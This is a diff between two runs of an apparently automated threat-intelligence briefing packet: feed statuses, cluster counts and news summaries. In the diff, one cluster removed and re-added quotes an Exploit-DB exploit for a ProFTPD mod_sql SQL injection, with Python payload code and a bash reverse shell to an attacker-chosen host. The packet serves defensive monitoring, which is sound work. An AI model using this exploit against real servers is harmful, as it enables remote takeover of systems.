@@ -1,14 +1,14 @@
 # PHANTOMSignal Briefing Packet
 
-- Generated: 2026-08-25T23:30:14.975808+00:00
+- Generated: 2026-08-26T01:44:15.185655+00:00
 - Lookback hours: 168
 - Lookback human: 7 days
 - Total feeds: 80
 - Feeds OK: 74
-- Total items in window: 296
-- Total clusters raw: 139
-- Total clusters in packet: 57
-- Dropped low score: 82
+- Total items in window: 292
+- Total clusters raw: 136
+- Total clusters in packet: 56
+- Dropped low score: 80
 - Dropped overflow: 0
 
 ## Cohort metadata
@@ -70,21 +70,26 @@
 
 ## Feed status
 
-- **CrowdStrike** (threat_research_primary)
-  - URL: https://www.crowdstrike.com/blog/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
 - **Unit 42** (threat_research_primary)
   - URL: https://unit42.paloaltonetworks.com/feed/
   - Status: ok
   - Item count: 15
   - In window count: 3
+- **CrowdStrike** (threat_research_primary)
+  - URL: https://www.crowdstrike.com/blog/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
 - **Trend Micro Research** (threat_research_primary)
   - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
   - Status: ok
   - Item count: 25
   - In window count: 0
+- **Microsoft Security Blog** (threat_research_primary)
+  - URL: https://www.microsoft.com/en-us/security/blog/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 2
 - **SentinelOne Labs** (threat_research_primary)
   - URL: https://www.sentinelone.com/labs/feed/
   - Status: ok
@@ -95,11 +100,6 @@
   - Status: parse_error
   - Item count: 0
   - In window count: 0
-- **Microsoft Security Blog** (threat_research_primary)
-  - URL: https://www.microsoft.com/en-us/security/blog/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 2
 - **Microsoft Threat Intelligence** (threat_research_primary)
   - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
   - Status: ok
@@ -115,15 +115,15 @@
   - Status: ok
   - Item count: 10
   - In window count: 1
-- **Kaspersky Securelist** (threat_research_primary)
-  - URL: https://securelist.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 1
 - **NCSC UK** (government_authoritative)
   - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
   - Status: ok
   - Item count: 20
+  - In window count: 1
+- **Kaspersky Securelist** (threat_research_primary)
+  - URL: https://securelist.com/feed/
+  - Status: ok
+  - Item count: 10
   - In window count: 1
 - **SANS Internet Storm Center** (government_authoritative)
   - URL: https://isc.sans.edu/rssfeed_full.xml
@@ -135,41 +135,41 @@
   - Status: ok
   - Item count: 15
   - In window count: 2
-- **ESET WeLiveSecurity** (threat_research_primary)
-  - URL: https://www.welivesecurity.com/en/rss/feed/
-  - Status: ok
-  - Item count: 100
-  - In window count: 0
 - **Horizon3 Attack Research** (offensive_vulnerability_research)
   - URL: https://horizon3.ai/feed/
   - Status: ok
   - Item count: 10
   - In window count: 7
+- **Recorded Future** (threat_research_primary)
+  - URL: https://www.recordedfuture.com/feed
+  - Status: ok
+  - Item count: 50
+  - In window count: 1
 - **Cisco Talos** (threat_research_primary)
   - URL: https://feeds.feedburner.com/feedburner/Talos
   - Status: ok
   - Item count: 15
   - In window count: 5
+- **ESET WeLiveSecurity** (threat_research_primary)
+  - URL: https://www.welivesecurity.com/en/rss/feed/
+  - Status: ok
+  - Item count: 100
+  - In window count: 0
 - **Volexity** (threat_research_primary)
   - URL: https://www.volexity.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **Recorded Future** (threat_research_primary)
-  - URL: https://www.recordedfuture.com/feed
-  - Status: ok
-  - Item count: 50
-  - In window count: 2
-- **Red Canary** (detection_response_operations)
-  - URL: https://redcanary.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 1
 - **GitHub Security Lab** (offensive_vulnerability_research)
   - URL: https://github.blog/category/security/feed/
   - Status: ok
   - Item count: 10
   - In window count: 0
+- **Red Canary** (detection_response_operations)
+  - URL: https://redcanary.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 1
 - **PortSwigger Research** (offensive_vulnerability_research)
   - URL: https://portswigger.net/research/rss
   - Status: ok
@@ -180,11 +180,6 @@
   - Status: ok
   - Item count: 50
   - In window count: 1
-- **watchTowr Labs** (offensive_vulnerability_research)
-  - URL: https://labs.watchtowr.com/rss/
-  - Status: ok
-  - Item count: 15
-  - In window count: 0
 - **The DFIR Report** (detection_response_operations)
   - URL: https://thedfirreport.com/feed/
   - Status: ok
@@ -200,8 +195,13 @@
   - Status: parse_error
   - Item count: 0
   - In window count: 0
-- **Active Countermeasures** (detection_response_operations)
-  - URL: https://www.activecountermeasures.com/feed/
+- **watchTowr Labs** (offensive_vulnerability_research)
+  - URL: https://labs.watchtowr.com/rss/
+  - Status: ok
+  - Item count: 15
+  - In window count: 0
+- **Proofpoint Threat Insight** (detection_response_operations)
+  - URL: https://www.proofpoint.com/us/rss.xml
   - Status: ok
   - Item count: 10
   - In window count: 0
@@ -210,8 +210,8 @@
   - Status: ok
   - Item count: 10
   - In window count: 1
-- **Proofpoint Threat Insight** (detection_response_operations)
-  - URL: https://www.proofpoint.com/us/rss.xml
+- **Active Countermeasures** (detection_response_operations)
+  - URL: https://www.activecountermeasures.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 0
@@ -219,22 +219,22 @@
   - URL: https://news.sophos.com/en-us/category/threat-research/feed/
   - Status: ok
   - Item count: 15
-  - In window count: 1
-- **Elastic Security Labs** (detection_response_operations)
-  - URL: https://www.elastic.co/security-labs/rss/feed.xml
-  - Status: ok
-  - Item count: 20
-  - In window count: 2
+  - In window count: 0
 - **SpecterOps** (detection_response_operations)
   - URL: https://medium.com/feed/specter-ops-posts
   - Status: ok
   - Item count: 10
   - In window count: 0
+- **Elastic Security Labs** (detection_response_operations)
+  - URL: https://www.elastic.co/security-labs/rss/feed.xml
+  - Status: ok
+  - Item count: 20
+  - In window count: 2
 - **Datadog Security Labs** (cloud_identity_infrastructure)
   - URL: https://securitylabs.datadoghq.com/rss/feed.xml
   - Status: ok
   - Item count: 30
-  - In window count: 2
+  - In window count: 1
 - **Orca Security Research** (cloud_identity_infrastructure)
   - URL: https://orca.security/resources/blog/feed/
   - Status: ok
@@ -250,33 +250,38 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **Huntress** (detection_response_operations)
-  - URL: https://www.huntress.com/blog/rss.xml
-  - Status: ok
-  - Item count: 100
-  - In window count: 7
-- **Trail of Bits** (offensive_vulnerability_research)
-  - URL: https://blog.trailofbits.com/feed/
-  - Status: ok
-  - Item count: 20
-  - In window count: 1
 - **Google Cloud Threat Intelligence** (threat_research_primary)
   - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
   - Status: ok
   - Item count: 20
   - In window count: 1
+- **Huntress** (detection_response_operations)
+  - URL: https://www.huntress.com/blog/rss.xml
+  - Status: ok
+  - Item count: 100
+  - In window count: 7
 - **Rapid7** (offensive_vulnerability_research)
   - URL: https://www.rapid7.com/blog/rss/
   - Status: ok
   - Item count: 20
   - In window count: 3
+- **Cloudflare Security** (cloud_identity_infrastructure)
+  - URL: https://blog.cloudflare.com/tag/security/rss/
+  - Status: ok
+  - Item count: 20
+  - In window count: 0
 - **Protect AI** (ai_security_agentic_risk)
   - URL: https://protectai.com/blog/rss.xml
   - Status: parse_error
   - Item count: 0
   - In window count: 0
-- **Cloudflare Security** (cloud_identity_infrastructure)
-  - URL: https://blog.cloudflare.com/tag/security/rss/
+- **Trail of Bits** (offensive_vulnerability_research)
+  - URL: https://blog.trailofbits.com/feed/
+  - Status: ok
+  - Item count: 20
+  - In window count: 1
+- **Cloudflare Radar** (cloud_identity_infrastructure)
+  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
   - Status: ok
   - Item count: 20
   - In window count: 0
@@ -285,41 +290,26 @@
   - Status: ok
   - Item count: 100
   - In window count: 0
-- **Wiz Research** (cloud_identity_infrastructure)
-  - URL: https://www.wiz.io/feed/rss.xml
-  - Status: ok
-  - Item count: 99
-  - In window count: 2
-- **Cloudflare Radar** (cloud_identity_infrastructure)
-  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
-  - Status: ok
-  - Item count: 20
-  - In window count: 0
 - **Google DeepMind Blog** (ai_security_agentic_risk)
   - URL: https://deepmind.google/blog/rss.xml
   - Status: ok
   - Item count: 100
   - In window count: 1
+- **Wiz Research** (cloud_identity_infrastructure)
+  - URL: https://www.wiz.io/feed/rss.xml
+  - Status: ok
+  - Item count: 99
+  - In window count: 2
 - **Coveware** (ransomware_ecrime_financial_crime)
   - URL: https://www.coveware.com/blog?format=rss
   - Status: parse_error
   - Item count: 0
   - In window count: 0
-- **OpenSSF Blog** (ai_security_agentic_risk)
-  - URL: https://openssf.org/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 1
 - **Chainalysis** (ransomware_ecrime_financial_crime)
   - URL: https://www.chainalysis.com/blog/feed/
   - Status: ok
   - Item count: 10
   - In window count: 2
-- **BleepingComputer** (cyber_news_breach_reporting)
-  - URL: https://www.bleepingcomputer.com/feed/
-  - Status: ok
-  - Item count: 15
-  - In window count: 15
 - **The Record** (cyber_news_breach_reporting)
   - URL: https://therecord.media/feed
   - Status: ok
@@ -330,11 +320,26 @@
   - Status: ok
   - Item count: 20
   - In window count: 0
+- **BleepingComputer** (cyber_news_breach_reporting)
+  - URL: https://www.bleepingcomputer.com/feed/
+  - Status: ok
+  - Item count: 15
+  - In window count: 15
+- **OpenSSF Blog** (ai_security_agentic_risk)
+  - URL: https://openssf.org/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 1
 - **Google Cloud Security** (cloud_identity_infrastructure)
   - URL: https://cloudblog.withgoogle.com/rss/
   - Status: ok
   - Item count: 20
   - In window count: 16
+- **GreyNoise** (cloud_identity_infrastructure)
+  - URL: https://www.greynoise.io/blog/rss.xml
+  - Status: ok
+  - Item count: 100
+  - In window count: 0
 - **SecurityWeek** (cyber_news_breach_reporting)
   - URL: https://www.securityweek.com/feed/
   - Status: ok
@@ -345,16 +350,6 @@
   - Status: ok
   - Item count: 10
   - In window count: 10
-- **GreyNoise** (cloud_identity_infrastructure)
-  - URL: https://www.greynoise.io/blog/rss.xml
-  - Status: ok
-  - Item count: 100
-  - In window count: 0
-- **Dark Reading** (cyber_news_breach_reporting)
-  - URL: https://www.darkreading.com/rss.xml
-  - Status: ok
-  - Item count: 50
-  - In window count: 23
 - **AI Snake Oil** (ai_security_agentic_risk)
   - URL: https://www.aisnakeoil.com/feed
   - Status: ok
@@ -370,48 +365,48 @@
   - Status: ok
   - Item count: 30
   - In window count: 17
+- **Dark Reading** (cyber_news_breach_reporting)
+  - URL: https://www.darkreading.com/rss.xml
+  - Status: ok
+  - Item count: 50
+  - In window count: 22
 - **Team Cymru** (ransomware_ecrime_financial_crime)
   - URL: https://www.team-cymru.com/post/rss.xml
   - Status: ok
   - Item count: 100
   - In window count: 0
-- **Troy Hunt** (practitioner_analysis)
-  - URL: https://www.troyhunt.com/rss/
-  - Status: ok
-  - Item count: 15
-  - In window count: 3
 - **Schneier on Security** (practitioner_analysis)
   - URL: https://www.schneier.com/feed/atom/
   - Status: ok
   - Item count: 10
   - In window count: 8
-- **Krebs on Security** (practitioner_analysis)
-  - URL: https://krebsonsecurity.com/feed/
+- **Troy Hunt** (practitioner_analysis)
+  - URL: https://www.troyhunt.com/rss/
   - Status: ok
-  - Item count: 10
-  - In window count: 0
+  - Item count: 15
+  - In window count: 3
 - **Reddit r/cybersecurity** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/cybersecurity/.rss
   - Status: ok
   - Item count: 0
+  - In window count: 0
+- **Reddit r/blueteamsec** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/blueteamsec/.rss
+  - Status: ok
+  - Item count: 0
+  - In window count: 0
+- **Krebs on Security** (practitioner_analysis)
+  - URL: https://krebsonsecurity.com/feed/
+  - Status: ok
+  - Item count: 10
   - In window count: 0
 - **Graham Cluley** (practitioner_analysis)
   - URL: https://grahamcluley.com/feed/
   - Status: ok
   - Item count: 20
   - In window count: 4
-- **Reddit r/blueteamsec** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/blueteamsec/.rss
-  - Status: ok
-  - Item count: 0
-  - In window count: 0
 - **Reddit r/sysadmin** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/sysadmin/.rss
-  - Status: ok
-  - Item count: 0
-  - In window count: 0
-- **Reddit r/netsecstudents** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/netsecstudents/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
@@ -425,6 +420,16 @@
   - Status: ok
   - Item count: 0
   - In window count: 0
+- **Intel 471** (ransomware_ecrime_financial_crime)
+  - URL: https://intel471.com/blog/feed
+  - Status: ok
+  - Item count: 100
+  - In window count: 1
+- **Reddit r/netsecstudents** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/netsecstudents/.rss
+  - Status: ok
+  - Item count: 0
+  - In window count: 0
 - **Infosecurity Magazine** (cyber_news_breach_reporting)
   - URL: https://www.infosecurity-magazine.com/rss/news/
   - Status: ok
@@ -435,11 +440,6 @@
   - Status: ok
   - Item count: 50
   - In window count: 50
-- **Intel 471** (ransomware_ecrime_financial_crime)
-  - URL: https://intel471.com/blog/feed
-  - Status: ok
-  - Item count: 100
-  - In window count: 1
 - **Reddit r/netsec** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/netsec/.rss
   - Status: ok
@@ -476,22 +476,21 @@
 ### Apple iOS/macOS vulnerability activity
 - Anchor signal: Apple iOS/macOS
 - Theme key: apple-ios-macos
-- Cluster count: 6
-- Article count: 7
-- Cohesion: 0.3
+- Cluster count: 5
+- Article count: 6
+- Cohesion: 0.329
 - Shared strong signals: Apple iOS/macOS
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
   - affected_products: Apple iOS/macOS
   - urgency_signals: preauth_unauth
-- Cluster IDs: af5d25c59b, 175a6a518c, a42d9f28e9, 114ded0230, 14a9e16bb3, dadc215b5f
+- Cluster IDs: af5d25c59b, 175a6a518c, a42d9f28e9, 14a9e16bb3, dadc215b5f
 - Links:
   - https://www.rapid7.com/blog/post/ra-microsoft-sharepoint-remote-code-execution-cve-2026-63520
   - https://thehackernews.com/2026/08/critical-macos-sharepoint-vcenter-and.html
   - https://www.wiz.io/blog/rust-supply-chain-attack-on-arrayref-significant-overlap-with-dprk-campaigns
   - https://www.infosecurity-magazine.com/news/australia-exploitation-teamcity/
-  - https://www.sophos.com/en-us/blog/fake-ai-real-malware-attackers-impersonating-ai-brands
   - https://www.huntress.com/blog/defcon-phishing-google-doc-malware
   - https://thehackernews.com/2026/08/a-malicious-webpage-could-poison-your.html
 
@@ -844,49 +843,6 @@ GitLab CE/EE GraphQL Directive Code Injection Vulnerability CVE-2026-19478 is a 
   - Link: https://thehackernews.com/2026/08/gitlab-cve-2026-19478-comes-under.html
   - Summary: A newly disclosed security flaw in GitLab has come under active exploitation within days of public disclosure, according to watchTowr. The vulnerability in question is CVE-2026-19478 (CVSS score: 9.4), a case of code injection that allows an unauthenticated attacker to modify or delete publicly accessible GitLab projects and rewrite their data under certain conditions without requiring
 
-### Cluster c0dbc49702 — score 27
-
-- Title: [remote] CVE-2026-42167 - ProFTPD mod_sql post-authentication SQLi - RCE
-- Source: Exploit-DB (offensive_vulnerability_research)
-- Published: 2026-08-25T00:00:00+00:00
-- Link: https://www.exploit-db.com/exploits/52658
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: CVE-2026-42167
-
-#### Cluster taxonomy (union across members)
-- cve_ids: CVE-2026-42167
-- urgency_signals: poc_available
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_1_offensive_research
-
-#### Primary article taxonomy
-- cve_ids: CVE-2026-42167
-- urgency_signals: poc_available
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_1_offensive_research
-
-#### Summary
-
-```
-CVE-2026-42167 - ProFTPD mod_sql post-authentication SQLi - RCE
-```
-
-#### Full body
-
-```
-Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training CVE-2026-42167 - ProFTPD mod_sql post-authentication SQLi - RCE EDB-ID: 52658 CVE: 2026-42167 EDB Verified: Author: youcef-! Type: remote Exploit: / Platform: Multiple Date: 2026-08-25 Vulnerable App: #!/usr/bin/env python3 """ CVE-2026-42167 — ProFTPD mod_sql post-authentication SQL injection -> RCE postauth_stor_rce.py --host <ftp-host> --port 21 \ --user <user> --password <pass> \ --shell-host <your-ip> --shell-port 443 SUMMARY ------- ProFTPD's mod_sql logs FTP activity through user-supplied SQL. Its escaping helper is_escaped_text() treats any value that BEGINS and ENDS with a single quote and contains no interior single quote as "already escaped", and passes it into the query verbatim. A STOR filename shaped that way therefore breaks out of the logging INSERT and stacks a second statement. With a PostgreSQL backend whose role is a superuser, that statement is COPY ... TO PROGRAM, which runs an arbitrary OS command. INSERT INTO xfer_audit VALUES('<basename>', '<user>', now()) basename = ', null, null); COPY (SELECT $$x$$) TO PROGRAM $$<cmd>$$; --' -> INSERT INTO xfer_audit VALUES('', null, null); -- 3 cols, closed COPY (SELECT $$x$$) TO PROGRAM $$<cmd>$$; -- stacked --', '<user>', now()) -- commented out Two constraints on the filename shape both queries around: * NO interior single quote -> the injected SQL is dollar-quoted ($$...$$), never single-quoted. * NO forward slash '/' -> FTP forbids it in a filename. The reverse shell needs /dev/tcp/<host>/<port>, so the slashes are produced at runtime by printf's octal escape \57 ('/'). THE BUG IN THE PUBLIC PoC (fixed here) -------------------------------------- The widely-circulated PoC builds the path as one printf format string: printf "\57dev\57tcp\57<host>\57<port>" # BROKEN printf greedily consumes up to THREE octal digits after a backslash. "\57" is only two, so if the very next character is itself an octal digit (0-7) it is swallowed into the escape: \57 + '1' -> \571 -> octal 571 = 0x179 -> 0x79 mod 256 = 'y' So a host or port whose first character is 0-7 is silently corrupted: host=192.168.118.7 port=4444 -> /dev/tcpy92.168.118.7/y444 (broken) That covers essentially every private-range attacker IP and every common listener port, which is why the bug is easy to miss (the PoC's defaults happen to fall in the safe class) and painful to hit — the only visible symptom is a reverse shell that never connects. FIX (this script): keep the four literal slashes in the format string, where each "\57" is followed by a non-octal character, and pass the attacker- controlled host/port as printf ARGUMENTS instead of interpolating them into the format string: printf "\57dev\57tcp\57%s\57%s" "<host>" "<port>" # CORRECT Now no user-controlled digit is ever adjacent to a "\57", so the corruption is structurally impossible for any host/port and on any conforming printf. CVE: CVE-2026-42167 SEVERITY: Critical (post-auth RCE) """ import argparse import ftplib import io import os import select import signal import socket import sys import termios import threading import time import tty def build_payload_filename(shell_host: str, shell_port: int) -> str: """Return the STOR filename that stacks a reverse-shell COPY TO PROGRAM. The reverse-shell command carries the target host/port as printf arguments (the fix), so no octal-escape corruption is possible. """ # /dev/tcp/<host>/<port> is assembled at runtime; the format string holds # only the slashes, the data is passed as %s arguments. shell_cmd = ( f'S=$(printf "\\57dev\\57tcp\\57%s\\57%s" "{shell_host}" "{shell_port}");' f'bash -c "bash -i >& $S 0>&1"' ) payload = ( "', null, null); " f"COPY (SELECT $$x$$) TO PROGRAM $${shell_cmd}$$" "; --'" ) # is_escaped_text() bypass + FTP filename rules — assert, don't hope. assert payload[0] == "'" and payload[-1] == "'", "must be single-quote wrapped" assert "'" not in payload[1:-1], "no interio
-```
-
-#### Corroborating sources (1)
-
-- **Exploit-DB** (offensive_vulnerability_research)
-  - Title: [remote] CVE-2026-42167 - ProFTPD mod_sql post-authentication SQLi - RCE
-  - Published: 2026-08-25T00:00:00+00:00
-  - Link: https://www.exploit-db.com/exploits/52658
-  - Summary: CVE-2026-42167 - ProFTPD mod_sql post-authentication SQLi - RCE
-
 ### Cluster 73e2ba5a94 — score 27
 
 - Title: Critical Elementor Pro File Upload Flaw Enables Unauthenticated Remote Code Execution on WordPress Sites
@@ -948,6 +904,49 @@ Executive Summary A critical vulnerability ( CVE-2026-32475 , CVSS 9.0) was disc
   - Published: 2026-08-24T19:26:32+00:00
   - Link: https://www.bleepingcomputer.com/news/security/hackers-target-wordpress-sites-in-miniorange-auth-bypass-attacks/
   - Summary: Hackers are attempting to exploit two critical authentication bypass vulnerabilities in the miniOrange SAML 2.0 Single Sign On plugin for WordPress that can be used to forge SAML responses and log in as administrators. [...]
+
+### Cluster c0dbc49702 — score 26
+
+- Title: [remote] CVE-2026-42167 - ProFTPD mod_sql post-authentication SQLi - RCE
+- Source: Exploit-DB (offensive_vulnerability_research)
+- Published: 2026-08-25T00:00:00+00:00
+- Link: https://www.exploit-db.com/exploits/52658
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: CVE-2026-42167
+
+#### Cluster taxonomy (union across members)
+- cve_ids: CVE-2026-42167
+- urgency_signals: poc_available
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_1_offensive_research
+
+#### Primary article taxonomy
+- cve_ids: CVE-2026-42167
+- urgency_signals: poc_available
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_1_offensive_research
+
+#### Summary
+
+```
+CVE-2026-42167 - ProFTPD mod_sql post-authentication SQLi - RCE
+```
+
+#### Full body
+
+```
+Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training CVE-2026-42167 - ProFTPD mod_sql post-authentication SQLi - RCE EDB-ID: 52658 CVE: 2026-42167 EDB Verified: Author: youcef-! Type: remote Exploit: / Platform: Multiple Date: 2026-08-25 Vulnerable App: #!/usr/bin/env python3 """ CVE-2026-42167 — ProFTPD mod_sql post-authentication SQL injection -> RCE postauth_stor_rce.py --host <ftp-host> --port 21 \ --user <user> --password <pass> \ --shell-host <your-ip> --shell-port 443 SUMMARY ------- ProFTPD's mod_sql logs FTP activity through user-supplied SQL. Its escaping helper is_escaped_text() treats any value that BEGINS and ENDS with a single quote and contains no interior single quote as "already escaped", and passes it into the query verbatim. A STOR filename shaped that way therefore breaks out of the logging INSERT and stacks a second statement. With a PostgreSQL backend whose role is a superuser, that statement is COPY ... TO PROGRAM, which runs an arbitrary OS command. INSERT INTO xfer_audit VALUES('<basename>', '<user>', now()) basename = ', null, null); COPY (SELECT $$x$$) TO PROGRAM $$<cmd>$$; --' -> INSERT INTO xfer_audit VALUES('', null, null); -- 3 cols, closed COPY (SELECT $$x$$) TO PROGRAM $$<cmd>$$; -- stacked --', '<user>', now()) -- commented out Two constraints on the filename shape both queries around: * NO interior single quote -> the injected SQL is dollar-quoted ($$...$$), never single-quoted. * NO forward slash '/' -> FTP forbids it in a filename. The reverse shell needs /dev/tcp/<host>/<port>, so the slashes are produced at runtime by printf's octal escape \57 ('/'). THE BUG IN THE PUBLIC PoC (fixed here) -------------------------------------- The widely-circulated PoC builds the path as one printf format string: printf "\57dev\57tcp\57<host>\57<port>" # BROKEN printf greedily consumes up to THREE octal digits after a backslash. "\57" is only two, so if the very next character is itself an octal digit (0-7) it is swallowed into the escape: \57 + '1' -> \571 -> octal 571 = 0x179 -> 0x79 mod 256 = 'y' So a host or port whose first character is 0-7 is silently corrupted: host=192.168.118.7 port=4444 -> /dev/tcpy92.168.118.7/y444 (broken) That covers essentially every private-range attacker IP and every common listener port, which is why the bug is easy to miss (the PoC's defaults happen to fall in the safe class) and painful to hit — the only visible symptom is a reverse shell that never connects. FIX (this script): keep the four literal slashes in the format string, where each "\57" is followed by a non-octal character, and pass the attacker- controlled host/port as printf ARGUMENTS instead of interpolating them into the format string: printf "\57dev\57tcp\57%s\57%s" "<host>" "<port>" # CORRECT Now no user-controlled digit is ever adjacent to a "\57", so the corruption is structurally impossible for any host/port and on any conforming printf. CVE: CVE-2026-42167 SEVERITY: Critical (post-auth RCE) """ import argparse import ftplib import io import os import select import signal import socket import sys import termios import threading import time import tty def build_payload_filename(shell_host: str, shell_port: int) -> str: """Return the STOR filename that stacks a reverse-shell COPY TO PROGRAM. The reverse-shell command carries the target host/port as printf arguments (the fix), so no octal-escape corruption is possible. """ # /dev/tcp/<host>/<port> is assembled at runtime; the format string holds # only the slashes, the data is passed as %s arguments. shell_cmd = ( f'S=$(printf "\\57dev\\57tcp\\57%s\\57%s" "{shell_host}" "{shell_port}");' f'bash -c "bash -i >& $S 0>&1"' ) payload = ( "', null, null); " f"COPY (SELECT $$x$$) TO PROGRAM $${shell_cmd}$$" "; --'" ) # is_escaped_text() bypass + FTP filename rules — assert, don't hope. assert payload[0] == "'" and payload[-1] == "'", "must be single-quote wrapped" assert "'" not in payload[1:-1], "no interio
+```
+
+#### Corroborating sources (1)
+
+- **Exploit-DB** (offensive_vulnerability_research)
+  - Title: [remote] CVE-2026-42167 - ProFTPD mod_sql post-authentication SQLi - RCE
+  - Published: 2026-08-25T00:00:00+00:00
+  - Link: https://www.exploit-db.com/exploits/52658
+  - Summary: CVE-2026-42167 - ProFTPD mod_sql post-authentication SQLi - RCE
 
 ### Cluster b61187f40b — score 21
 
@@ -1392,16 +1391,16 @@ lurker • August 20, 2026 3:38 PM May 26 – July 4 is 40 days that Agents have
   - Published: 2026-08-20T17:44:36+00:00
   - Link: https://www.schneier.com/blog/archives/2026/08/detailed-timeline-of-openais-cyberattack-on-hugging-face.html
   - Summary: OpenAI presented details of its AI’s model’s cyberattack on Hugging Face at Black Hat last week. Simon Willison details the timeline. It’s really interesting to read through—and really impressive cyberoffense work.
-- **Help Net Security** (cyber_news_breach_reporting)
-  - Title: Fake OpenAI Codex download tricks macOS users into installing malware
-  - Published: 2026-08-25T12:40:44+00:00
-  - Link: https://www.helpnetsecurity.com/2026/08/25/fake-openai-codex-download-macos-users/
-  - Summary: A malware campaign using a sponsored search ad and a fake OpenAI Codex download page to trick macOS users into pasting a malicious command into Terminal has been uncovered by Cato Networks. It’s a variation of ClickFix, a popular social engineering technique that persuades victims to execute the infection step themselves rather than opening a malicious file. The attack starts with a sponsored search result for queries such as “codex macos download.” The ad appears … More → The post Fake OpenAI Codex download tricks macOS users into installing malware appeared first on Help Net Security .
 - **Simon Willison** (ai_security_agentic_risk)
   - Title: ChatGPT search now uses the site:operator at scale
   - Published: 2026-08-20T23:57:32+00:00
   - Link: https://simonwillison.net/2026/Aug/20/chatgpt-search-now-uses-the-siteoperator-at-scale/
   - Summary: ChatGPT search now uses the site:operator at scale Promptwatch is part of the emerging "GEO" space, for Generative Engine Optimization - the chatbot version of SEO, where companies offer tools and consulting to help your site increase its presence in replies to prompts inside tools like ChatGPT. The Promptwatch product uses automation to track responses to prompts across end-user chat products like ChatGPT, Claude, and Gemini. They publish aggregate reports on this as part of their own content marketing strategy, which do seem to provide credible hints as to otherwise invisible design changes to those products. Their own tracking shows a notable change aligned with the GPT-5.6 rollout earlier this month: The percentage of all ChatGPT Search fanout queries that contain the site:operator, per day. The share hovered between 0.3% and 0.5% for weeks, dipped briefly to 0.15% on August 3 to 5 (consistent with a staged rollout or pre-launch experiment), then jumped to 16-17% on August 8. It's
+- **Help Net Security** (cyber_news_breach_reporting)
+  - Title: Fake OpenAI Codex download tricks macOS users into installing malware
+  - Published: 2026-08-25T12:40:44+00:00
+  - Link: https://www.helpnetsecurity.com/2026/08/25/fake-openai-codex-download-macos-users/
+  - Summary: A malware campaign using a sponsored search ad and a fake OpenAI Codex download page to trick macOS users into pasting a malicious command into Terminal has been uncovered by Cato Networks. It’s a variation of ClickFix, a popular social engineering technique that persuades victims to execute the infection step themselves rather than opening a malicious file. The attack starts with a sponsored search result for queries such as “codex macos download.” The ad appears … More → The post Fake OpenAI Codex download tricks macOS users into installing malware appeared first on Help Net Security .
 - **Dark Reading** (cyber_news_breach_reporting)
   - Title: New CUSTODY Framework Constrains AI Agents Inside the Network
   - Published: 2026-08-20T20:42:18+00:00
@@ -1623,49 +1622,6 @@ The safety penalty: Reclaiming operational sovereignty in the age of AI By David
   - Published: 2026-08-25T10:00:22+00:00
   - Link: https://blog.talosintelligence.com/the-safety-penalty-reclaiming-operational-sovereignty-in-the-age-of-ai/
   - Summary: As frontier AI models become increasingly restrictive, security teams are facing a "safety penalty" that hampers real-time incident response. Discover how organizations can move toward operational sovereignty to ensure their defensive AI keeps pace with unconstrained adversaries.
-
-### Cluster 022e3da4a1 — score 11
-
-- Title: Mexico’s Cybersecurity Plan 2025-2030: Turning Ambition Into Defense
-- Source: Recorded Future (threat_research_primary)
-- Published: 2026-08-25T00:00:00+00:00
-- Link: https://www.recordedfuture.com/blog/mexico-cybersecurity-plan
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: apt_espionage, credential_theft, ransomware_extortion
-- affected_industries: critical_infrastructure, education, financial_services, government
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Primary article taxonomy
-- threat_categories: ransomware_extortion, credential_theft, apt_espionage
-- affected_industries: financial_services, government, critical_infrastructure, education
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Summary
-
-```
-Explore Mexico’s 2025–2030 Cybersecurity Plan. Learn about key threats, including ransomware, and the roadmap for building durable national cyber defenses.
-```
-
-#### Full body
-
-```
